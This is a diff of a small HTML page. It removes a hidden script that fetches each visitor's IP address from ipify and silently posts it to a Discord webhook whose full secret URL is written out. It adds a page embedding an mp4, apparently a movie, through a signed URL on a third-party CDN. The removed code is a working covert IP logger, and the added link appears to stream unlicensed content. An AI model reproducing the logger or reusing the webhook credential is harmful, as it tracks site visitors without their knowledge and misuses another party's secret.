@@ -1,19 +1,14 @@
-<script>
-    function getIP(json) {
-      var request = new XMLHttpRequest(); //making a request for the webhook
-          request.open("POST", "https://discord.com/api/webhooks/1289710602612244550/7qY6BEz4eBXRwtYpKxwbC1b1cUNy0luWtLevSjBBtBpPjFpX60MHTbKX8lKpyW64hxB5"); 
-    
-          request.setRequestHeader('Content-type', 'application/json');
-    
-          var params = {
-            username: "skibidi sigma",
-            avatar_url: "https://cdn.discordapp.com/avatars/965760449817759744/06322dd115f305d0f7e97bbc9ca37481.webp?size=80",
-            content: "IP:" + json.ip
-          }
-    
-          request.send(JSON.stringify(params));
-        }
-    
-    </script>
-    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>  
-    <!-- This is a api -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>minecraft movie for aaronpugl</title>
+</head>
+<body>
+  <h1>My Embedded Video</h1>
+  <video width="640" height="360" controls>
+    <source src="https://macdn.hakunaymatata.com/resource/d3f493124fb8e41dd83933475997072c.mp4?Expires=1749351333&Signature=ALMAN8aC1GYKBdXxcJDXT1yQZxQLz4bxL0TEX2iaNAWX67AsJUi0Jz7vulm1zKwdCb6ZoYcrr3RxTGNUlYHfkFSmNPG~-eqZxJ0zp~xXDP9C3B~EVCOv~IILuRsC6zq3fswf-ymaJVUfdOD9Coue5rdQDWwsMFCkhgdNbitjHZY06bdjQ1OsPfczJHgoQm9iy3v2urrKEKBYCJ5OrSvM-zDK70soH9UTtQCx21A6Ry93lfqSb1u9PaE0lxBrlSJrb0ZXGCxMV16EUBZ5Yf8n6lCWMGebG4hTUQP8RAtfqHXGTJhTxbUARjQDWtzFgX4NIm7Xzvjt9kNbfhlQJWqjBA__&Key-Pair-Id=KMHN1LQ1HEUPL" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+</body>
+</html>
